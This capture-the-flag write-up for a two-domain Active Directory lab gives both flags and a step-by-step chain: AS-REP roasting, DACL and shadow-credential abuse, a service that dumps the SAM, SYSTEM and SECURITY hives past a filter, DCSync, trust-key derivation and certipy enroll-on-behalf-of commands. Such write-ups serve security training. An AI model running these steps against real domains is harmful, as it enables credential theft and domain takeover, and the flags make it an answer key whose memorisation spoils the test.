# Old Trusty (ad) — 2 flags

**Flags:**
`PP{d4cl-4cls-sh4d0ws-4nd-s3rv1c3s}`
`PP{trvst-th3-c3rt1f1c4t3-ch41n}`

Two domain controllers in one trust setup:

- **LEGACY** domain: `DC01.legacy.corp` (Windows Server 2025 build 26100)
- **CORE** domain: `DC02.core.corp`

Anonymous access is almost fully locked down (no share listing, no anonymous
LDAP search, no guest). The intended chain: compromise **legacy**, then abuse
the trust to reach **core**.

## Flag 1 — compromise LEGACY

1. **User enumeration.** Anonymous SAMR works on DC01:
   `rpcclient -U '' -N DC01` → `enumdomusers` (or impacket's SAMR) returns 13
   users: `Administrator, Guest, krbtgt, jdoe, svc_ops, asmith, bjones,
   cmiller, dwilson, egarcia, fmartin, gthomas, hbrown`.

2. **AS-REP roast.** `jdoe` is the only user without Kerberos pre-auth
   (send an AS-REQ without pre-authentication data; you get an AS-REP back).
   The KDC only speaks AES for this account, so build the
   `$krb5asrep$18$...` hash and crack it offline
   (PBKDF2-HMAC-SHA1, 4096 iterations, salt `LEGACY.CORPjdoe`).
   Password: `spongebob1`.

3. **DACL recon.** With `jdoe` authenticated (SMB/LDAP work fine), enumerate
   ACLs. `jdoe` (RID 1103) is a member of `Legacy App Maintainers` (RID 1113)
   and that group has **WriteProperty/member** on `Infrastructure Support`
   (RID 1114).

4. **Shadow credentials.** `Infrastructure Support` has WriteProperty on
   `msDS-KeyCredentialLink` of `svc_ops` (RID 1104). Add a KeyCredential for
   `svc_ops` (Certipy `shadow auto` or a manual
   `msDS-KeyCredentialLink` write + PKINIT), obtain `svc_ops`'s TGT via
   PKINIT.

5. **Server Operators.** `svc_ops` is in the built-in **Server Operators**
   group → local admin on the DC, including service control.

6. **Abuse the `ReportSync` service.** `services.py` (or `sc.py`) shows the
   `ReportSync` service, `SERVICE_START_NAME LocalSystem`, demand-start, with
   a binary path that does:

   ```
   cmd.exe /c reg save HKLM\SYSTEM C:\Users\Public\SYSTEM.hive
   & reg save HKLM\SECURITY C:\Users\Public\SECURITY.hive
   & reg save HKLM\SAM C:\Users\Public\SAM.hive
   ```

   The command verb is filtered — bypass it with caret escaping
   (`sav^e`). Start the service, then read the hives from `C:\Users\Public`
   over SMB as `svc_ops`.

7. **Offline secretsdump** of SYSTEM+SECURITY recovers the `DC01$` machine
   account key (AES256/NT). `DC01$` has DCSync rights on LEGACY — replicate
   anything you need.

**Flag 1** is on the LEGACY Administrator's desktop; read
`C:\Users\Administrator\Desktop\flag.txt` with any admin access:
`PP{d4cl-4cls-sh4d0ws-4nd-s3rv1c3s}`.

## Flag 2 — pivot to CORE through the trust

1. Read the trusted-domain object
   `CN=core.corp,CN=System,DC=legacy,DC=corp`: `trustDirection = 2`
   (core **trusts** legacy), partner `core.corp`, and a 512-byte
   `trustAuthOutgoing` secret (readable via DRSUAPI replication as `DC01$`).

2. Derive the inter-realm AES256 key from that shared secret:

   - the secret blob decodes as UTF-16LE (with `errors='replace'`) and is then
     treated as UTF-8,
   - Kerberos string-to-key (RFC3962) with salt `CORE.CORPkrbtgtLEGACY`
     (note: **no** trailing `$`).

   A quick way to confirm the derivation: the KDC advertises exactly this salt
   in `PA-ETYPE-INFO2`. With the derived key you can request a TGT for
   `LEGACY$@CORE.CORP` (the trust account exists in CORE).

3. With `LEGACY$`'s Core TGT, request a CIFS ticket for `DC02.core.corp`.
   The **Software$** share of the core DC is readable and contains
   `PKI\LegacyClient\enrollment-agent.xml` with the credentials of
   `svc_enrollment` (authority `CORE-CA`, template `EnrollmentAgent`).

4. **ADCS enroll-on-behalf-of.** Authenticate as `svc_enrollment`, request a
   certificate from the `EnrollmentAgent` template, then use it to enroll
   *for* another principal:

   ```
   certipy req -u svc_enrollment@CORE.CORP -p '<password>' -ca CORE-CA \
       -template EnrollmentAgent -dc-ip <CORE DC IP>          # agent cert
   certipy req -u svc_enrollment@CORE.CORP -p '<password>' -ca CORE-CA \
       -template User -on-behalf-of 'CORE\administrator' \
       -pfx svc_enrollment.pfx -dc-ip <CORE DC IP>            # admin cert
   certipy auth -pfx administrator.pfx -dc-ip <CORE DC IP>
   ```

5. The resulting `administrator.ccache` is a Core-domain TGT. Use it
   (PKINIT) to read `C:\Users\Administrator\Desktop\flag.txt` on the CORE DC
   or to DCSync CORE outright.

**Flag 2:** `PP{trvst-th3-c3rt1f1c4t3-ch41n}` — "trust the certificate chain".
